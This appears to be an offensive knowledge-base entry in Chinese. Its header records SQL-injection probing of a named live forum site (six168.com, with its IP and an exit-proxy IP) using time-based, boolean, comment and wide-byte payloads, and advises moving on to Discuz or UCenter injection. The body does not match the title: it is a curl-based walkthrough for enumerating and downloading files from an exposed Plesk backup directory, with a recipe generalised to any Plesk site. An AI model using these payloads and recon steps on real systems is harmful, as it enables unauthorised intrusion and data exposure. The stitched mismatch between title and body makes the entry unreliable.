# SCLUB 门户 index.phtml 登录注入在 six168.com 实例已证否（NICKNAME 被转义/白名单，SLEEP 零延时）

- **code**: sclub-门户-index.phtml-登录注入在-six168.com-实例已证否-nickname-被转义-白名单
- **kind**: poc
- **category**: sqli
- **component**: SCLUB 免费论坛托管平台 / index.phtml 站长登录
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-08 在 six168.com（Host: six168.com，IP 60.199.107.145，经出口 45.149.186.242）实测：正常登录 NICKNAME=168six&PASSWORD=wrongpass 返回 5042B「您輸入的密碼錯誤請重新輸入!!」；NICKNAME=168six' AND SLEEP(5) AND '1'='1 返回 200/0.620s（对照 0.433s，零延时）；NICKNAME=168six' OR '1'='1、168six'-- -、168six'#、%bf%27/%a1%27/%81%27/%95%27/%e0%27/%c0%27/%d0%27 宽字节、UNION 1~26 列与 KB 原 18 列形态、双重编码、GET 传参、PASSWORD/DOMAIN 位 SLEEP 全部回门户页且无效；尾随空格仍匹配用户说明等值比较真实存在但参数被中和。KB 原注入路径 /<论坛域名> 在本实例 404。
- **tags**: sclub,sqli,negative,index.phtml,discuz
- **created_at**: 2026-11-08T08:33:37.984Z
- **engine**: http://six168.com/index.phtml (60.199.107.145, 论坛 168six.six168.com)

## 描述

对 SCLUB 门户站长登录（POST /index.phtml，PUT=LOGON&NICKNAME=&PASSWORD=&DOMAIN=，需 Referer: http://<门户>/?PUT=web_sort_logon，否则 POST 被忽略直接返回门户首页）做完整注入判别：NICKNAME 不进入 SQL 表达式（SLEEP(5) 零延时），PASSWORD/DOMAIN 亦不进入；UNION/布尔/注释/宽字节全灭。判据：尾随空格能匹配已存在用户（返回口令错误页 5042B），而无匹配时返回门户首页 25556B——两者可作无损 oracle，但注入不成立。注意：早期 KB 的 SCLUB 注入（203.0.113.98 /<domain> 路径）是另一实例的另一套布局。

## 用法

```
再遇 SCLUB 门户时先跑两发判定：① NICKNAME=已存在用户&PASSWORD=wrong → 若回「您輸入的密碼錯誤」(约5KB)说明 handler 正常；② NICKNAME=已存在用户' AND SLEEP(5) AND '1'='1 → 计时，<1s 即该参数被中和，直接放弃此口，改打论坛自身 Discuz 注入面或 UCenter。
```

## 正文

```
# copperline 部署备份目录匿名可读（Plesk/Apache 静态站点）

## 前置条件
- 目标静态站点由 Plesk + Apache 托管，web 根下残留部署备份目录（本例 `/bbs-<product>/Backup/`）。
- 目录关闭了 index 列举（403），但未对具体文件做访问控制。
- 无需任何凭据/Cookie；HTTPS 直连即可（Cloudflare 前置时用浏览器 UA，单线程低速率）。

## 复现步骤

### 1. 证明目录存在且只是"禁列"
```bash
HOST=copperline.<domain>
PROD=bbs-copperline

# 无斜杠 → 301，证明目录存在
curl -skI "https://$HOST/$PROD/Backup"

# 带斜杠 → 403，Plesk "Forbidden"（约 1909B），只是禁止目录列举
curl -sk -D- -o /dev/null "https://$HOST/$PROD/Backup/"

# OPTIONS → 200，content-type: httpd/unix-directory，allow: POST,OPTIONS,HEAD,GET
# 这是服务端对"它是目录"的硬确认
curl -sk -X OPTIONS -D- -o /dev/null "https://$HOST/$PROD/Backup/"
```

实测响应（2026-11-11）：
```
HTTP/2 403
content-type: text/html; charset=utf-8
content-length: 1909     # Plesk Forbidden 页

HTTP/2 200
allow: POST,OPTIONS,HEAD,GET
content-type: httpd/unix-directory
```

### 2. 直读备份子目录里的交付文档
```bash
curl -sk -D- "https://$HOST/$PROD/Backup/new/README.md" | head -20
```
实测：`HTTP/2 200`，`content-type: text/markdown`，`content-length: 4741`，
正文首行：
```
# Copperline web bundle for Retro32 (2026-07-20, fourth drop)
```
README 内含构建时间、版本、文件清单与构建/部署说明。

### 3. 按 README 清单取文件（size 与 content-type 双重校验）
```bash
for f in \
  new/README.md \
  new/try.js \
  new/pkg/copperline_web.js \
  new/pkg/copperline_web_bg.wasm \
  new/aros/LICENSE \
  new/adf/retro32-term.adf \
  new/copperline.json.example \
  README.md ; do
  code=$(curl -sk -o "/tmp/$(basename "$f")" -w '%{http_code} %{size_download} %{content_type}' \
        "https://$HOST/$PROD/Backup/$f")
  echo "$f -> $code"
done
```
实测结果：
| 路径 | 状态 | 大小 |
|---|---|---|
| `/Backup/new/README.md` | 200 text/markdown | 4741 |
| `/Backup/new/try.js` | 200 | 90628 |
| `/Backup/new/pkg/copperline_web.js` | 200 | 28978 |
| `/Backup/new/pkg/copperline_web_bg.wasm` | 200 | 2216856 |
| `/Backup/new/aros/LICENSE` | 200 | 24679 |
| `/Backup/new/adf/retro32-term.adf` | 200 | 901120 |
| `/Backup/new/copperline.json.example` | 200 | 145 |
| `/Backup/README.md` | 200 text/markdown | 5058 |

配置示例内容（泄露后端桥接端点）：
```json
{"df0":"adf/retro32-term.adf","joy":"off","floppy_sounds":false,
 "serial_url":"wss://bbs.<domain>:8443/","autoboot":true}
```
上一级 `README.md` 泄露发布版本：v0.18.0（commit 2d12257f）。

### 4. 阴性对照（必做）
```bash
curl -sk -o /dev/null -w '%{http_code} %{size_download}\n' \
  "https://$HOST/$PROD/Backup/zzq-nonexistent-9f3a"
# 实测：404 1922   （Plesk 404 固定长度）
```
403（禁列）与 404（不存在）可差分，且 200 文件的大小与 README 声明一致，
排除"全站 SPA 壳页一律 200"的假阳性。

### 5. 已排除的路径（避免重复投入）
- `/Backup/New/`、`/Backup/2026-07-20/` → 404（大小写/日期命名无效）。
- `/Backup/*.zip`（110+ 常见备份文件名）→ 全部 404，无压缩包直下。
- `/Backup/%2e%2e/` 等穿越 → 返回 200 重定向壳页，非真实穿越，不要误报。

## 影响与定性
- 泄露：产品版本、构建日期、完整文件清单、前端 wasm/js、示例配置与 WebSocket 端点
  `wss://bbs.<domain>:8443/`。
- 未见：服务端源码、凭据、数据库配置、私钥。故定级 low（信息泄露），
  价值在于为后续 WebSocket 桥接服务与前端逆向提供入口与版本基线。

## 通用化
任何 Plesk/Apache 静态站点都适用此判据：
`301(无斜杠) + 403(禁列) + OPTIONS: httpd/unix-directory` 三者同现即备份目录存在，
随后按 `new|latest|old|dist|build|YYYY-MM-DD` 小字典 + README 反推文件名逐个取。
```
